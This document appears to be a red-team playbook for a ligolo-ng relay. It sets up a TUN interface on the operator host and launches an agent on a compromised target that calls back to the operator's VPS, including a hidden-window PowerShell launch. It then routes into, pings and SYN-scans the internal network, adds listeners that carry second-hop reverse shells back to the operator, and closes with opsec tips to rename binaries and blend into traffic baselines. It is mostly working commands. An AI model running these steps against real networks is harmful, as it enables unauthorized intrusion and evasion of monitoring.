# Ligolo-ng Proxy: TUN Relay Landing Node

Operates the ligolo-ng `proxy` server on the operator side and terminates an `agent` connection that originates from the target network, turning that connection into a routable TUN interface (`INTERFACE`) on this host. Once the interface is up, every tool on this machine reaches the agent-side subnet with normal IP routing instead of a per-connection proxy, so ICMP, UDP, SYN scans and non-HTTP protocols behave exactly as they do on a local segment. Console output, captured session transcripts and route tables land under `RESULT_DIR`; the resulting relay is recorded as a `tunnel` row with `kind=other` and an explicit `entry_kind`.

## When to use

- A TCP-only pivot is not enough: `nmap -sS`, `ping`, `traceroute`, DNS over UDP, RDP with UDP transport, SMB named pipes or any tool that needs raw sockets or non-TCP traffic.
- You already hold code execution on a host that can open an outbound TCP connection to `VPS_IP:LISTEN_PORT`, and you want the whole /24 or /16 behind it reachable by IP.
- Several tools and several operators must share one path at the same time without re-establishing a proxy per command.
- A second hop is needed: a listener on this proxy that receives reverse shells from hosts deeper in the agent-side network (`listener_add`).
- Not for the first foothold. The agent needs an existing execution channel (WebShell, SSH, scheduled task) to start, so use `suo5-tunnel` or `chisel-tunnel` when only HTTP egress exists.
- Not for a target that blocks all non-HTTP egress: ligolo-ng speaks TLS on a raw port, so a proxy-only egress path belongs to `chisel-tunnel` with `--proxy` or to `suo5-tunnel` over the WebShell.

## Prerequisites

- Tooling: `bash $DSH_HOME/redteam/setup.sh --yes` drops `$DSH_HOME/redteam/toolkit/ligolo/proxy` (this host) and `$DSH_HOME/redteam/toolkit/ligolo/agent` (staged for the target). If the script cannot fetch, download the `proxy_*_linux_amd64.tar.gz` and `agent_*_linux_amd64.tar.gz` release archives yourself, unpack both into `$DSH_HOME/redteam/toolkit/ligolo/`, and `chmod +x proxy agent`.
- Kernel TUN on this host: `/dev/net/tun` must exist (`ls -l /dev/net/tun`). Creating the interface needs root or `CAP_NET_ADMIN`.
- A reachable ingress address. Either the operator host is directly reachable (`VPS_IP`), or the agent reaches it through an outbound path the target already allows.
- Certificate plan: `--selfcert` for a throwaway certificate, or `--certfile server.crt --keyfile server.key` when a CA-signed certificate survives inspection better.
- Nothing here is mandatory and every step has a fallback. Without TUN privileges, fall back to the SOCKS5 path in `chisel-tunnel` or to `suo5-tunnel` plus `proxychains4 -f RESULT_DIR/proxychains-LISTEN_PORT.conf`. Without TLS on the wire, `frp-tunnel` covers a plain TCP relay. If `setup.sh` is unavailable, any ligolo-ng build from the project releases works with the same flags.

## Workflow

1. Preflight the host: confirm the binary runs, the tun device exists, and the port is free.

```bash
$DSH_HOME/redteam/toolkit/ligolo/proxy --version
ls -l /dev/net/tun
ss -lntp | grep -E ':LISTEN_PORT\b' || echo "LISTEN_PORT free"
```

2. Create the TUN interface named `INTERFACE` and bring it up. This is the exact name every later route references.

```bash
sudo ip tuntap add user "$(id -un)" mode tun INTERFACE
sudo ip link set INTERFACE up
ip addr show INTERFACE
```

   On a build whose interactive help lists `interface_create`, the equivalent inside the proxy console is `interface_create --name INTERFACE`; use whichever the binary actually exposes.

3. Start the proxy server. Prefer the self-signed certificate for a short operation and a real certificate when the traffic may be inspected.

```bash
sudo $DSH_HOME/redteam/toolkit/ligolo/proxy \
  --selfcert \
  --laddr 0.0.0.0:LISTEN_PORT \
  2>&1 | tee RESULT_DIR/ligolo-proxy-LISTEN_PORT.log
```

   Older builds use `-l 0.0.0.0:LISTEN_PORT` instead of `--laddr`. Add `--certfile server.crt --keyfile server.key` instead of `--selfcert` for a signed pair, and `-v` when you need handshake detail in the log.

4. Target side, separate shell: start the agent so it dials back to `VPS_IP:LISTEN_PORT`. A self-signed proxy requires `-ignore-cert`; a signed certificate lets you drop that flag.

```bash
# Linux target, staged in /tmp
/tmp/agent -connect VPS_IP:LISTEN_PORT -ignore-cert -retry
```

```powershell
# Windows target
Start-Process -FilePath C:\Windows\Temp\agent.exe -ArgumentList '-connect','VPS_IP:LISTEN_PORT','-ignore-cert' -WindowStyle Hidden
```

   Behind an HTTP-only egress, insert the corporate proxy: `-proxy http://TARGET_IP:PORT`. Add `-tun` only when the agent runs as root and must relay through a local interface instead of the userspace stack.

5. Read the proxy console. A new line such as `INFO[0001] Agent joined. name=... remote=...` appears; select the session, then read the agent-side interfaces to learn which subnets are actually behind it.

```text
ligolo-ng » session
? Specify a session : 1 - user@host - 10.10.14.7:52104 - agent
[Agent : user@host] » ifconfig
```

6. Add routes. `autoroute` derives them from the agent interfaces; for a single segment a manual route is easier to audit and easier to remove.

```text
[Agent : user@host] » autoroute
# or explicit:
[Agent : user@host] » start
```

```bash
sudo ip route add TARGET_IP/24 dev INTERFACE
ip route get TARGET_IP
```

7. Start the relay and prove it with a protocol a SOCKS proxy cannot carry.

```text
[Agent : user@host] » start
```

```bash
ping -c 3 TARGET_IP
sudo nmap -sS -Pn -p PORT TARGET_IP -oN RESULT_DIR/nmap-ligolo-TARGET_IP.txt
curl -sv --max-time 5 http://TARGET_IP:PORT/ 2>&1 | head -40
```

8. Optional second hop: land reverse shells that originate inside the agent network, so a host that can reach only its own segment still reaches you.

```text
[Agent : user@host] » listener_add --addr 0.0.0.0:PORT --to 127.0.0.1:LPORT --tcp
[Agent : user@host] » listener_list
```

   Then the payload on the deeper host points at the agent-side address of this listener, and the connection is forwarded back to `127.0.0.1:LPORT` on this machine where `shell-handler` catches it. Undo with `listener_stop --id <n>`.

## Output and evidence

- `RESULT_DIR/ligolo-proxy-LISTEN_PORT.log` — proxy console transcript including the agent join line, session ids and listener registrations.
- `RESULT_DIR/routes-<timestamp>.txt` — `ip route show dev INTERFACE` plus `ip addr show INTERFACE`, so the exact reachability claim is reproducible.
- `RESULT_DIR/nmap-ligolo-TARGET_IP.txt` — the first active scan that proves traffic crossed the interface into the agent-side segment.
- Record the relay with `redteam_tunnel_add`: `kind=other`, `listen=VPS_IP:LISTEN_PORT`, `entry` = the exact agent command line, `reach` = the agent-side CIDRs taken from `ifconfig`, `entry_kind=target-agent` because the forwarding runs in a process on the target. Use `target-outbound` instead when the agent was launched by a reverse shell you already hold, and never `self-only` — that value means the relay never left your own server.
- `redteam_asset_add` each newly reachable host with `provenance=active`, `tool=ligolo-ng`, and `state` set from the ping or scan result.
- `redteam_evidence_record` with `operation=tunnel_established`, `authority=tool-output`, `confidence=observed`, and the ping or scan output inside `result`.
- When the listener receives something, that shell belongs to `shell-handler` for the handler side and to `redteam_webshell_add` or `redteam_credential_add` only once you actually hold a session or a secret.

## Failure modes

- `failed to create TUN interface: operation not permitted` → the proxy is not root and has no `CAP_NET_ADMIN` → run under `sudo`, or `sudo setcap cap_net_admin+ep` on the binary, or switch to the SOCKS5 fallback.
- `listen tcp :LISTEN_PORT: bind: address already in use` → an earlier proxy still owns the port → `ss -lntp | grep LISTEN_PORT`, kill the stale pid, and reuse the existing session instead of starting a second one.
- Agent line never appears and the proxy log shows a TLS error → self-signed certificate without `-ignore-cert` on the agent, or a wrong port → restart the agent with `-ignore-cert`, verify with `nc -vz VPS_IP LISTEN_PORT` from the target.
- Agent joins, routes exist, but nothing answers → `start` was never issued, or the return path is asymmetric → issue `start`, then check `ip route get TARGET_IP` reports `dev INTERFACE`.
- `RTNETLINK answers: File exists` on `ip route add` → `autoroute` already installed that CIDR → `ip route show dev INTERFACE` first, add only the gaps.
- `ping` works but TCP does not → the agent-side host has a local firewall dropping the port → verify with `nc -vz` from the agent host itself, and scan a port the host actually listens on.
- Session disappears after a few minutes idle → agent was started without `-retry`, or NAT dropped the flow → restart with `-retry` and keep a keepalive through periodic `ping`.

## Notes

- One interface per operation. Reusing `INTERFACE` across two proxies mixes sessions and makes teardown ambiguous.
- Every reconnect produces a new session id and clears `autoroute` results, so re-run `autoroute` or `ip route add` after a reconnect instead of assuming reachability survived.
- Rate: keep scans at `RATE` packets per second (`nmap --min-rate RATE`) and `THREADS` parallel probes. The agent relays single-threaded through the target process, so aggressive scans show up as CPU load and as flow counts on the target's own monitoring.
- Opsec: `--selfcert` presents a certificate with random fields and no chain, which looks like an unknown TLS service on the wire. Rename the staged binary, avoid the default port when the network baseline allows it, and prefer an egress port the target already talks to.
- Idempotency: `ip tuntap add` fails when the interface exists — `ip link show INTERFACE` first and reuse it. `listener_add` with the same address pair does not deduplicate, so use `listener_list` before adding.
- Cleanup, in this order: `stop` in the console, `listener_stop --id <n>` for each listener, kill the agent on the target, `sudo ip route del <cidr> dev INTERFACE` for each route, `sudo ip link del INTERFACE`, then `redteam_tunnel_update` with `id` and `status=down` so the panel stops offering a dead path.
- Keep the proxy inside `tmux` or a detached session; an SSH drop otherwise kills the relay mid-scan and leaves routes pointing at a dead interface.
